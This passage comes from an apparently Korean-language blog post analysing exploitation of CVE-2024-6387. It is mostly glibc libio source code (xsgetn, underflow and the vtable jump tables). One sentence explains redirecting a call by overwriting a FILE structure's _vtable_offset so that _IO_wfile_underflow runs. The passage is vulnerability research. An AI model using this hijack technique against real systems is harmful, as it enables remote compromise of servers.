<span class="k">typedef</span> <span class="nf">size_t</span> <span class="p">(</span><span class="o">*</span><span class="n">_IO_xsgetn_t</span><span class="p">)</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">FP</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">DATA</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">N</span><span class="p">);</span>
<span class="cp">#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
#define _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)
</span></code></pre></div> </div> </div> </details> <details> <summary>libio/fileops.c:_IO_file_xsgetn</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span>
<span class="nf">_IO_file_xsgetn</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">want</span><span class="p">,</span> <span class="n">have</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">count</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>

  <span class="n">want</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="k">while</span> <span class="p">(</span><span class="n">want</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">have</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">want</span> <span class="o">&lt;=</span> <span class="n">have</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">memcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">want</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">+=</span> <span class="n">want</span><span class="p">;</span>
	  <span class="n">want</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="p">{</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">have</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="n">s</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">have</span><span class="p">);</span>
	      <span class="n">want</span> <span class="o">-=</span> <span class="n">have</span><span class="p">;</span>
	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">+=</span> <span class="n">have</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="cm">/* Check for backup and repeat */</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
	    <span class="p">{</span>
	      <span class="n">_IO_switch_to_main_get_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	      <span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="cm">/* If we now want less than a buffer, underflow and repeat
	     the copy.  Otherwise, _IO_SYSREAD directly to
	     the user buffer. */</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
	      <span class="o">&amp;&amp;</span> <span class="n">want</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
	    <span class="p">{</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">__underflow</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
		<span class="k">break</span><span class="p">;</span>

	      <span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="cm">/* These must be set before the sysread as we might longjmp out
	     waiting for input. */</span>
	  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
	  <span class="n">_IO_setp</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>

	  <span class="cm">/* Try to maintain alignment: read a whole number of blocks.  */</span>
	  <span class="n">count</span> <span class="o">=</span> <span class="n">want</span><span class="p">;</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="kt">size_t</span> <span class="n">block_size</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span>
		<span class="n">count</span> <span class="o">-=</span> <span class="n">want</span> <span class="o">%</span> <span class="n">block_size</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
	      <span class="k">else</span>
		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>

	      <span class="k">break</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="n">s</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
	  <span class="n">want</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
	    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
	<span class="p">}</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="n">n</span> <span class="o">-</span> <span class="n">want</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_file_xsgetn</span><span class="p">)</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/genops.c</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">__underflow</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">_IO_fwide</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_in_put_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">_IO_switch_to_main_get_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
	<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_IO_have_markers</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">save_for_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">_IO_have_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="n">_IO_free_backup_area</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">_IO_UNDERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">__underflow</span><span class="p">)</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/libioP.h:_IO_UNDERFLOW(FP),_IO_WUNDERFLOW(FP)</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The 'underflow' hook tries to fills the get buffer.
   It returns the next character (as an unsigned char) or EOF.  The next
   character remains in the get buffer, and the get position is not changed.
   It matches the streambuf::underflow virtual function. */</span>
<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="o">*</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">);</span>
<span class="cp">#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)
#define _IO_WUNDERFLOW(FP) WJUMP0 (__underflow, FP)
</span></code></pre></div> </div> </div> </details> <p>여기서 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>멤버를 덮어 오프셋에 의해 호출되는 함수를 <code class="language-plaintext highlighter-rouge">_IO_file_underflow</code> 대신 <code class="language-plaintext highlighter-rouge">_IO_wfile_underflow</code>를 호출하게 만듭니다.</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/call_graph3.png" /></p> <details> <summary>libio/fileops.c:_IO_file_jumps</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_file_xsputn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_new_file_seekoff</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_new_file_setbuf</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_new_file_sync</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
<span class="p">};</span>
<span class="n">libc_hidden_data_def</span> <span class="p">(</span><span class="n">_IO_file_jumps</span><span class="p">)</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/wfileops.c:_IO_wfile_jumps</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_wfile_jumps</span> <span class="n">libio_vtable</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_new_file_finish</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">)</span> <span class="n">_IO_wfile_overflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="n">_IO_wfile_underflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">)</span> <span class="n">_IO_wdefault_uflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">)</span> <span class="n">_IO_wdefault_pbackfail</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_wfile_xsputn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_wfile_seekoff</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_new_file_setbuf</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">)</span> <span class="n">_IO_wfile_sync</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_wfile_doallocate</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
<span class="p">};</span>
<span class="n">libc_hidden_data_def</span> <span class="p">(</span><span class="n">_IO_wfile_jumps</span><span class="p">)</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/fileops.c:_IO_new_file_underflow</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">ssize_t</span> <span class="n">count</span><span class="p">;</span>

  <span class="cm">/* C99 requires EOF to be "sticky".  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_EOF_SEEN</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span><span class="o">|</span><span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="cm">/* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */</span>
      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">((</span><span class="n">stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	  <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	<span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>

      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="cm">/* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span>
    <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
      <span class="k">else</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">)</span>
</code></pre></div> </div> </div> </details> <details> <summary>libio/wfileops.c:_IO_wfile_underflow</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">wint_t</span>
<span class="nf">_IO_wfile_underflow</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">cd</span><span class="p">;</span>
  <span class="k">enum</span> <span class="n">__codecvt_result</span> <span class="n">status</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">count</span><span class="p">;</span>

  <span class="cm">/* C99 requires EOF to be "sticky".  */</span>
